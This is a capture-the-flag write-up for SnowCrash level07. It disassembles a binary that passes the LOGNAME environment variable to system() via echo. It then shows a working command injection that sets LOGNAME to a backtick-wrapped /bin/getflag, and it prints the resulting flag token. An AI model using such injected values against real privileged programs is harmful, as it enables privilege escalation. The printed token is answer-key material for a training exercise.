# Snow-crash - level07
## Find something
```bash
level07@SnowCrash:~$ ls
level07
```
* On exec of level07, we get "level07"
```bash
level07@SnowCrash:~$ ./level07 
level07
```
* With objdump -S we can see the usage of "getenv@plt" and "system@plt"
```bash
level07@SnowCrash:~$ objdump -S level07
[...]
 8048576:       e8 85 fe ff ff          call   8048400 <getenv@plt>
 804859a:       e8 71 fe ff ff          call   8048410 <system@plt>
[...]
```
* With objdump -s we can see the usage of 2 strings for getenv and system
```bash
level07@SnowCrash:~$ objdump -S level07
[...]
Contents of section .rodata:
 8048678 03000000 01000200 4c4f474e 414d4500  ........LOGNAME.
 8048688 2f62696e 2f656368 6f202573 2000      /bin/echo %s .
[...]
```
* At this point LOGNAME is "level07" as seen above. So this binary displays LOGNAME by executing echo with system. Which mean we can use echo to execute getflag by passing '\`/bin/getflag\`' to LOGNAME
```bash
level07@SnowCrash:~$ export LOGNAME=\`/bin/getflag\` && ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```